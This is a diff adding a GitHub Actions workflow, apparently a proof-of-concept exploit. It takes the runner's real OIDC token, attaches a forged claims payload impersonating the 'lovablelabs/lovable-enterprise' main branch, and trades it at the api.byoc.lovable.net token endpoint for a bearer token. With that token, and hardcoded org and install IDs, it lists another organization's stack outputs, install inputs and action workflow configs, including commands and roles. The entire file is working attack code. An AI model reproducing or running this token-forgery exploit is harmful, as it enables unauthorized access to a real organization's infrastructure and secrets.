@@ -1,0 +1,35 @@
+name: phonehome-impact-inventory
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Inspect the safe legacy sandbox impact consumers
+        shell: bash
+        run: |
+          set -euo pipefail
+          org='orgl9cvkaqh1g8yv2jqdb19247'
+          install='inl7h8dc7abcc5odljmi4762mj'
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          token="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request" | jq -r .token)"
+          auth=(-H "Authorization: Bearer $token" -H "X-Nuon-Org-ID: $org")
+          stack="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/stack" "${auth[@]}")"
+          actions="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/actions?limit=100" "${auth[@]}")"
+          jq -nc --argjson keys "$(jq -c '(.install_stack_outputs.data_contents // .outputs // {}) | keys' <<<"$stack")" --argjson input_keys "$(jq -c '(.install_stack_outputs.data_contents.install_inputs // .outputs.install_inputs // {}) | keys' <<<"$stack")" --argjson action_count "$(jq 'length' <<<"$actions")" '{stack_output_keys:$keys,install_input_keys:$input_keys,action_count:$action_count}'
+          while IFS=$'\t' read -r action name; do
+            cfg="$(curl -sSf "https://api.byoc.lovable.net/v1/action-workflows/$action/latest-config" "${auth[@]}")"
+            jq -nc --arg action_id "$action" --arg name "$name" --argjson triggers "$(jq -c '[.triggers[]?.type]' <<<"$cfg")" --argjson enable_kube_config "$(jq -c '.enable_kube_config // false' <<<"$cfg")" --arg role "$(jq -r '.role // ""' <<<"$cfg")" --argjson steps "$(jq -c '[.steps[]? | {name,command:(.command|tostring),has_git:(.connected_github_vcs_config!=null or .public_git_vcs_config!=null)}]' <<<"$cfg")" '{action_id:$action_id,name:$name,triggers:$triggers,enable_kube_config:$enable_kube_config,role:$role,steps:$steps}'
+          done < <(jq -r '.[] | [.action_workflow_id, .action_workflow.name] | @tsv' <<<"$actions")
